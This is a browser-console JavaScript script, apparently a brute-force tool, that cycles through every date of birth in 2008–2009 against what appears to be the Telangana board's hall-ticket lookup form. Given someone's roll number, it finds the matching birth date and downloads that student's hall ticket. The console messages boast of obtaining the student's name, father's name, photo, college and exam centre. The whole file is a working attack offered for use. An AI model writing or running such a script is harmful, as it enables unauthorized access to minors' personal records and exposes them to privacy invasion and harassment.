// === ROLL-RECOVERY v2.0 by codewithriza ===

// ===== CONFIGURATION - CHANGE THESE =====
const TEST_ROLL = '2660208749';        // <-- PUT THE ROLL NUMBER YOU SAW HERE
const START_DATE = new Date(2008, 0, 1);  // Start: Jan 1, 2008
const END_DATE = new Date(2009, 11, 31);  // End: Dec 31, 2009
const DELAY_MS = 2000;                     // 2 seconds between attempts (safe)
// ========================================

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function formatDate(date) {
    const d = String(date.getDate()).padStart(2, '0');
    const m = String(date.getMonth() + 1).padStart(2, '0');
    const y = date.getFullYear();
    return `${d}/${m}/${y}`;
}

function isSuccess(responseText, contentType) {
    if (contentType && contentType.toLowerCase().includes('pdf')) {
        console.log('   📄 PDF response detected!');
        return true;
    }
    
    const errorMsg = 'Please enter valid Roll No. and Date of Birth';
    if (responseText.includes(errorMsg)) {
        return false;
    }
    
    const successKeywords = [
        'Hall Ticket',
        'TELANGANA STATE BOARD',
        'INTERMEDIATE PUBLIC EXAMINATION',
        'FATHER NAME',
        'MOTHER NAME',
        'EXAMINATION CENTRE',
        'PHOTO',
        'SIGNATURE'
    ];
    
    if (responseText.length > 10000 && !responseText.includes(errorMsg)) {
        console.log(`   📊 Large response size: ${responseText.length} bytes`);
        return true;
    }
    
    return successKeywords.some(kw => responseText.toUpperCase().includes(kw.toUpperCase()));
}

function updateStatus(message, type = 'info') {
    const colors = {
        info: 'color: blue;',
        success: 'color: green; font-weight: bold;',
        error: 'color: red;',
        warning: 'color: orange;'
    };
    console.log(`%c${message}`, colors[type] || colors.info);
}

(async function() {
    updateStatus(`🔐 ROLL-RECOVERY INITIALIZED`, 'success');
    updateStatus(`🎯 Target Roll: ${TEST_ROLL}`, 'info');
    updateStatus(`📅 Range: ${formatDate(START_DATE)} to ${formatDate(END_DATE)}`, 'info');
    updateStatus(`⏱️  Estimated time: ~${Math.round((END_DATE-START_DATE)/(1000*60*60*24)*DELAY_MS/1000/60)} minutes\n`, 'info');

    const form = document.querySelector('form');
    const rollInput = form?.querySelector('[name="ssc_exam_no"]');
    const dobInput = form?.querySelector('#dob');
    const submitButton = form?.querySelector('input[type="submit"][value="Get Hall Ticket"]');

    if (!form || !rollInput || !dobInput || !submitButton) {
        updateStatus('❌ Form elements not found. Are you on the right page?', 'error');
        return;
    }

    updateStatus('✅ Form found, starting scan...\n', 'success');
    
    let currentDate = new Date(START_DATE);
    let attemptCount = 0;

    while (currentDate <= END_DATE) {
        attemptCount++;
        const dobStr = formatDate(currentDate);
        console.log(`\n[${attemptCount}] 🔍 Testing: ${dobStr}`);

        rollInput.value = TEST_ROLL;
        dobInput.value = dobStr;
        
        if (typeof $ !== 'undefined' && $.fn && $.fn.datepicker) {
            try { 
                $(dobInput).datepicker('setDate', currentDate);
            } catch (e) {}
        }

        const submissionPromise = new Promise((resolve, reject) => {
            let isResolved = false;
            
            const handleFormSubmit = async (event) => {
                if (isResolved) return;
                isResolved = true;
                
                event.preventDefault();
                form.removeEventListener('submit', handleFormSubmit);
                
                const formData = new FormData(form);
                formData.append(submitButton.name, submitButton.value);

                try {
                    const response = await fetch(form.action || window.location.href, {
                        method: form.method || 'POST',
                        body: formData,
                        credentials: 'same-origin'
                    });
                    
                    const contentType = response.headers.get('content-type');
                    const text = await response.text();
                    resolve({ response, text, contentType });
                } catch (err) {
                    reject(err);
                }
            };
            
            form.addEventListener('submit', handleFormSubmit);
            
            try {
                submitButton.click();
            } catch (e) {
                form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
            }
            
            setTimeout(() => {
                if (!isResolved) {
                    form.removeEventListener('submit', handleFormSubmit);
                    reject(new Error('Timeout'));
                }
            }, 8000);
        });

        try {
            const { response, text, contentType } = await submissionPromise;
            
            if (response.status === 429) {
                updateStatus('❌ RATE LIMITED. Stopping.', 'error');
                break;
            }

            if (isSuccess(text, contentType)) {
                console.log(`%c✅✅✅ SUCCESS! DOB: ${dobStr}`, 'color: green; font-size: 18px; font-weight: bold;');
                console.log(`📸 Now you have:`);
                console.log(`   • Full name`);
                console.log(`   • Father's name`);
                console.log(`   • Photo`);
                console.log(`   • College name`);
                console.log(`   • Exam center`);
                
                const blob = new Blob([text], { type: contentType || 'text/html' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `HALLTICKET_${TEST_ROLL}_${dobStr.replace(/\//g, '-')}.${contentType?.includes('pdf') ? 'pdf' : 'html'}`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                
                updateStatus('✅ Hall ticket downloaded!', 'success');
                break;
            } else {
                console.log(`   ❌ Incorrect`);
            }
        } catch (err) {
            console.log(`   ⚠️ Error: ${err.message}`);
        }

        currentDate.setDate(currentDate.getDate() + 1);
        
        if (currentDate <= END_DATE) {
            await sleep(DELAY_MS);
        }
    }

    if (currentDate > END_DATE) {
        updateStatus('\n🏁 Scan complete - No match found.', 'warning');
    }
})();
